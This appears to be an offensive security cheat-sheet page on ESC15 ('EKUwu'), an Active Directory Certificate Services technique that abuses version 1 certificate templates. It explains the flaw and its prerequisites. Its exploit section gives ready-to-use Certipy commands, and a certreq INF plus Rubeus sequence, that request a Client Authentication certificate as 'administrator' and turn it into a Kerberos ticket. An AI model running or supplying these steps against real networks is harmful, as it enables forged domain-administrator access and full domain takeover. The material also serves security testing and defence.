# ESC15

{% hint style="info" %}
EKUwu - Abuse of default version 1 of templates to 'override' EKUs
{% endhint %}

## Why It Works

* Discovered by Justin Bollinger (TrustedSec) in 2024. Affects **schema version 1** certificate templates specifically.
* On V1 templates, the CA does not strictly override the **Application Policies** extension in the client's CSR with the template's own configured EKUs under certain conditions - meaning a low-privileged requester can specify their **own arbitrary Application Policy OIDs** (e.g. Client Authentication, `1.3.6.1.5.5.7.3.2`) in the request, and the CA honors them.
* This means even a completely mundane V1 template - one never intended to support authentication at all (e.g. a basic "User" template meant only for encryption/signing) - can be abused to obtain a **Client Authentication-capable certificate**, as long as the requester has ordinary enrollment rights on it.
* Combined with the ability to also supply a SAN (directly, or via subject building rules on many default V1 templates), this becomes a full ESC1-equivalent domain admin certificate forgery **on templates that were never flagged as risky by earlier ESC1-14 checks**, since those checks look at the template's *configured* EKU, not what a client can smuggle in via the request.

## Prerequisites

* Target template has **schema version 1**.
* Enrollment rights for a low-privileged principal (this applies far more broadly than ESC1-14 since almost any V1 template qualifies).

## Enumerate

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Certipy (recent versions) flags ESC15 for schema-version-1 templates enrollable by low-priv principals
```

## Exploit

{% tabs %}
{% tab title="Certipy" %}
```bash
## Request a cert from an otherwise 'safe' V1 template, but override the Application Policy to Client Authentication
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <any-v1-template> -application-policies "Client Authentication" -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endtab %}

{% tab title="certreq + INF + Rubeus" %}
```bat
REM Build a custom INF request file overriding the Application Policy to Client Authentication
echo [Version] > esc15.inf
echo Signature="$Windows NT$" >> esc15.inf
echo [NewRequest] >> esc15.inf
echo Subject = "CN=administrator" >> esc15.inf
echo KeyUsage = 0xa0 >> esc15.inf
echo MachineKeySet = False >> esc15.inf
echo [EnhancedKeyUsageExtension] >> esc15.inf
echo OID=1.3.6.1.5.5.7.3.2 >> esc15.inf
echo [RequestAttributes] >> esc15.inf
echo CertificateTemplate = <any-v1-template> >> esc15.inf

certreq -new esc15.inf esc15.req
certreq -submit -config "<CA-ServerDomain>\<CA-Name>" esc15.req esc15.cer
certreq -accept esc15.cer

REM Export and convert, then request a TGT as the impersonated identity
Rubeus.exe asktgt /user:administrator /certificate:esc15.pfx /ptt
```
{% endtab %}
{% endtabs %}

## References

* [TrustedSec - EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
